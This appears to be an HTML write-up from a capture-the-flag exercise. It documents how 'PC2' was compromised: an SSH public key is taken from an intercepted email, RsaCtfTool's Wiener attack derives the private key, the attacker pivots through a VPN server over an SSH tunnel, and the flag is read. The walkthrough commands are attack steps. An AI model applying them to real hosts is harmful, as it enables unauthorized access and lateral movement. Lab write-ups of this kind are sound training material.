@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Readme</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+  </style>
+  <style type="text/css">body {
+font-family: Arial, sans-serif;
+line-height: 1.6;
+background-color: #121212;
+color: #e0e0e0;
+padding: 20px;
+}
+h1, h2, h3, h4, h5, h6 {
+color: #ff9800; 
+}
+code {
+background-color: #333;
+padding: 2px 4px;
+border-radius: 4px;
+font-family: 'Courier New', Courier, monospace;
+color: #ff5722; 
+}
+pre {
+background-color: #333;
+padding: 10px;
+border-radius: 4px;
+overflow-x: auto;
+color: #ff5722; 
+}
+a {
+color: #bb86fc;
+text-decoration: none;
+}
+a:hover {
+text-decoration: underline;
+}
+ul {
+margin: 20px 0;
+padding: 0 20px;
+border-left: 2px solid #ff9800; 
+}
+li {
+margin: 10px 0;
+}
+strong {
+color: #ff9800; 
+}
+</style>
+</head>
+<body>
+<h1 id="pc2">PC2</h1>
+<ol type="1">
+<li><p><strong>Resume From <a href="../4_VPN%20server">VPN Server</a></strong></p></li>
+<li><p><strong>Email Server, rsa Key: <a href="../2_mail_server/08-store0/4/msg/0/257-2.msg">SSH RSA</a></strong></p>
+<pre class="text"><code>سلام
+لطفا کلید عمومی مرا در سرور اضافه کنید تا بتوانم بدون پسورد به آن وصل شوم.
+
+ssh-rsa AAAAB3NzaC1yc2EAAAEAXNQtOdb1y7O+7egOkNhfL37yUDDJ+nLnYBn0CWkIS0pI/B3kaX+UlMebbW6BEWvpqlMXuVhMMEOFwTKDNpNoQya8egwZm1wLVGyjB46FtKCb41qax7TEEq+Dw9/xGaKWCHii7lTNyt6fofB4vp0FXo0jZxGstGp3vmbirXoHnGShMw0RRPA6Cii2laqBGmFyIlFbl9iMDkZOA2Q+rl0yERqeaIK90epCluwUy0tyYqDlfxAysDBwhkhhB9fSr2+IE9x6ZKa2eRkY44RXYLvEpCEZUJ5kV1c5Xi+V/3nUscPq2gTXt++8uILoR23Pn55gm2RJFj83d846rcT6GAuvbQAAAQBfoXkf+My9/MadpBr99ZD/re4yVW36jl+RfGpScBRoMX5NOY3MHra24scoVhZdP4xcEtHzkmLw4EaoWQYcQNbQKH9zZpHzpQ2mCw4RLzBJrvaf+8UIYkOLZndlJKnQVdIRrYjTHoMsQGg7zMrUIdjtMACmhRlJ7FmwxPb2xd8mWksrt8h6hI0m1Vlk8sTgNkpUcHDxYmy5ppLGDv0QlJ6VRncNmlvA2E7mDe/8LNvy1scKatDCnZsMkfdtdr2iNC9A/3tcJxgcNYP59pi2ELVaL51XMEpy5DPKArnikftC+GWhO2GsffKFo+6XQ4YfTomMyAdwjITMnNuRol/lXjf/</code></pre></li>
+<li><p><strong>Wiener Attack</strong></p>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=M-yg0vbrAOk">YouTube Video</a></li>
+<li><a href="https://cryptohack.gitbook.io/cryptobook/untitled/low-private-component-attacks/wieners-attack">CryptoHack Guide</a></li>
+</ul></li>
+<li><p><strong>Get <a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a> into: <a href="./04-RsaCtfTool/">RsaCtfTool</a></strong></p></li>
+<li><p><strong>Running Rsa Ctf Tools</strong></p>
+<pre class="shell"><code>python3 -m pip install -r 04-RsaCtfTool/requirements.txt
+python3 04-RsaCtfTool/RsaCtfTool.py --publickey 02-ssh-rsa.rezaee.pub --attack wiener --private --output 05-rsa.rezaee.priv</code></pre></li>
+<li><p><strong>Change Access Permissions:</strong></p>
+<pre class="shell"><code>chmod 600 05-rsa.rezaee.priv</code></pre></li>
+<li><p><strong>SSH into VPN Server</strong></p>
+<pre class="shell"><code>ssh -i ./id_ed25519 -p 2200 vpn_user@172.16.3.64</code></pre></li>
+<li><p><strong>Get IP of PC2</strong></p>
+<pre class="shell"><code>ping -c 1 pc2</code></pre></li>
+<li><p><strong>SSH Tunnel Through VPN Server</strong></p>
+<pre class="text"><code>   &lt;Hacker&gt;-------(SSH Tunnel)-------&lt;VPN Server&gt;--------------&lt;PC2&gt;
+   |                                                          |
+    ----------------------(SSH Connection)--------------------
+0.0.0.0:7777                                            10.233.27.37:22</code></pre>
+<pre class="shell"><code># In a New Terminal
+ssh -N -i ./id_ed25519 -p 2200 -L 0.0.0.0:7777:10.233.27.37:22 vpn_user@172.16.3.64</code></pre></li>
+<li><p><strong>Connect to PC2 through Tunnel</strong></p>
+<pre class="shell"><code>ssh -p 7777 -i 05-rsa.rezaee.priv rezaee@127.0.0.1</code></pre></li>
+<li><p><strong>Read Flag:</strong></p>
+<pre class="shell"><code>cat /flag.txt</code></pre>
+<p><code>MAZAPA_dedcf160a1253afd73918666b0c6edb3</code></p></li>
+</ol>
+</body>
+</html>
